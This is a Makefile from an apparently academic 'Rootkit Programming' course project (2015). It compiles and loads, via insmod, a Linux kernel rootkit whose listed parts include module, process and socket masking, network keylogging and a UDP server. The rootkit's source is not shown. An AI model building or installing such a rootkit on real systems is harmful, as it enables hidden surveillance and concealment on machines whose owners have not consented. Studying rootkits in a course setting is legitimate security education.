
###############################################################################
#                                                                             #
#   Course: Rootkit Programming                                               #
#   Semester: WS 2015/16                                                      #
#   Team: 105                                                                 #
#   Assignment: 7                                                             #
#                                                                             #
#   Filename: Makefile                                                        #
#                                                                             #
#   Authors:                                                                  #
#       Name: Matei Pavaluca                                                  #
#       Email: mateipavaluca@yahoo.com                                        #
#                                                                             #
#       Name: Nedko Stefanov Nedkov                                           #
#       Email: nedko.stefanov.nedkov@gmail.com                                #
#                                                                             #
#   Date: December 2015                                                       #
#                                                                             #
#   Usage: This Makefile compiles the module `rootkit.c`                      #
#                                                                             #
###############################################################################

SYSMAP_SCRIPT = ./sysmap.sh
SYSMAP_HEADER = ./sysmap.h

KDIR = /lib/modules/$(shell uname -r)/build
TARGET = rootkit

obj-m += $(TARGET).o
rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o conf_manager.o jsmn.o udp_server.o core.o
ccflags-y = -Wno-unused-function

all:	sysmap
	make -C $(KDIR) M=$(PWD) modules
	@echo "\nRootkit successfully compiled\n"

clean:
	make -C $(KDIR) M=$(PWD) clean
	@echo "\nUseless files successfully deleted\n"

install:	all
	insmod $(TARGET).ko
	@echo "\nRootkit successfully installed\n"

uninstall:
	rmmod $(TARGET).ko
	make -C $(KDIR) M=$(PWD) clean
	@echo "\nRootkit successfully uninstalled\n"

sysmap:
	$(SYSMAP_SCRIPT)
	@echo "\nSysmap header file successfully created\n"

